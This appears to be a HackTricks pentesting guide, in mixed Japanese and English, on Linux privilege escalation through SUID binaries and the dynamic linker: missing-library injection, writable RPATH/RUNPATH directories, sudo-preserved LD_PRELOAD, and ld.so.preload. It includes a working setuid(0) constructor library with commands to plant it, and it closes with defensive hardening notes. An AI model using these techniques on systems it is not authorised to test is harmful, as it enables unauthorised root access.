# SUID Shared Library and Linker Abuse

{{#include ../../banners/hacktricks-training.md}}

SUID binaries は通常、直接的な command execution について調査されますが、custom SUID programs は dynamic linker を介して脆弱になる場合もあります。共通するテーマは単純で、privileged executable が、lower-privileged user に影響を与えられる path または configuration から code を load するというものです。

このページでは、generic technique patterns に焦点を当てます。missing libraries、writable library directories、`RPATH`/`RUNPATH`、sudo を介した `LD_PRELOAD`、linker configuration、そして SUID hardlink confusion について扱います。

## Fast Enumeration

まず、通常とは異なる SUID files を見つけ、それらが dynamically linked かどうかを確認します。
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
非標準の場所、custom application paths、root が所有しているものの package-managed directories の外部にある binaries、そして writable directories から load される dependencies に注目します。

Useful writeability checks:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

一部のカスタム SUID binary は、存在しない shared object を load しようとします。見つからない path が attacker によって制御されている directory 配下にある場合、その binary は effective user として attacker が用意した code を load する可能性があります。

失敗した library lookup を確認します:
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
バイナリが `libexample.so` を書き込み可能なパスで検索する場合、最小限の proof library では constructor を使用できます。検証中は、impact の proof を無害なものにしてください：
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
バイナリがロードしようとする正確なファイル名でビルドします：
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
悪用可能な条件は、library が不足していることだけではありません。attacker は、特権 loader が受け入れる path に、互換性のある shared object を配置できなければなりません。

## Writable Library Directory

すべての依存関係が存在していても、それらの解決に使用されるディレクトリのいずれかが writable になっている場合があります。これにより、読み込まれる library を置き換えたり、同じ名前の、優先度が高い library を配置したりできる可能性があります。

dependency path を確認します。
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
ディレクトリが書き込み可能な場合は、lab で copy-safe な方法を使って検証してください。稼働中の host 上で system libraries を置き換えると、authentication、package management、または boot-critical services が壊れる可能性があります。

## RPATH and RUNPATH

`RPATH` と `RUNPATH` は、loader に libraries の検索場所を指示する dynamic-section entries です。attacker が書き込み可能な directories を指している場合、SUID programs では危険です。

検出方法:
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
危険な出力の例:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
`/opt/app/lib` が書き込み可能で、バイナリが `libcustom.so` を必要とする場合、攻撃者はそこに悪意のある `libcustom.so` を配置できる可能性があります：
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` と `RUNPATH` は、すべての解決の詳細において同一ではありませんが、privilege-escalation の review では実務上の疑問は同じです。SUID binary が、attacker-writable な directory から library name を検索するかどうかです。

## LD_PRELOAD、LD_LIBRARY_PATH と SUID

通常の program では、`LD_PRELOAD` と `LD_LIBRARY_PATH` によって shared object の loading を強制または制御できます。SUID program では、dynamic loader は通常 secure-execution mode に入り、危険な environment variable を無視します。

つまり、user が `LD_PRELOAD` を設定できるというだけでは、通常の SUID binary は一般に vulnerable ではありません。
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
一般的な例外は sudo の設定ミスです。`sudo -l` の結果で `LD_PRELOAD` や `LD_LIBRARY_PATH` などの変数が保持されることが示されている場合、sudo で許可されたコマンドが attacker-controlled code をロードする可能性があります。
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
以下のケースを混同しないでください。

- 通常の SUID binary に対する `LD_PRELOAD`: 通常は secure execution によってブロックされます。
- sudo によって保持される `LD_PRELOAD`: exploit の可能性があります。
- writable path に存在しない `.so`: SUID binary がその path を自然に読み込む場合、exploit 可能です。
- writable directory を指す `RPATH`/`RUNPATH`: 必要な library を制御できる場合、exploit 可能です。
- `/etc/ld.so.preload` または linker config への write access: system-wide に影響し、impact が大きくなります。

## Linker Configuration

dynamic linker は、`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、linker cache、さらに場合によっては `/etc/ld.so.preload` などの system configuration も読み込みます。

High-value checks:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Writable linker configuration is usually more serious than a single vulnerable SUID binary because it can affect many dynamically linked processes. `/etc/ld.so.preload` は、特権プロセスに shared object を強制的に読み込ませられるため、特に危険です。

## SUID Hardlink Confusion

Hardlink によって、同じ SUID inode を複数の名前で表示できます。これは、特権 helper を隠したり、cleanup を混乱させたり、単純なパスベースのレビューを回避したりするのに役立ちます。

複数の link を持つ SUID ファイルを検索します：
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
同じ inode へのすべてのパスを確認します:
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
この abuse は、hardlink が permissions を変更するというものではありません。abuse の本質は path confusion です。privileged inode が、defender や script の想定しない name から到達可能になる可能性があります。inode と hardlink のより詳しい workflow については、[Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md) を参照してください。

## Defensive Notes

- SUID binaries は可能な限り最小限にし、監査を行い、package-managed にする。
- writable または application-managed な directories を指す `RPATH`/`RUNPATH` entries は避ける。
- library directories は root-owned にし、regular users が writable にできないようにする。
- `LD_PRELOAD`、`LD_LIBRARY_PATH`、その他同様の loader variables を sudo 経由で保持しない。
- `/etc/ld.so.preload`、`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、および想定外の SUID files を monitor する。
- hardlinked SUID files を review し、standard system paths 外にある custom SUID wrappers を調査する。
{{#include ../../banners/hacktricks-training.md}}
